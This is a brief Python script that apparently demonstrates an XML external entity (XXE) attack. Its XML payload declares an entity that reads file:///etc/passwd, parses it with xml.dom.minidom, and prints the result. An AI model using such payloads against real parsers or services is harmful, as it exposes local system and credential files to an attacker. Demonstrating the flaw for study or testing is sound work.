import xml.dom.minidom

# XML input with a malicious external entity
xml_data = """
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
"""

# Parse the XML using xml_minidom
dom = xml.dom.minidom.parseString(xml_data)

# Extract and print the content of the parsed XML
print(dom.toxml())

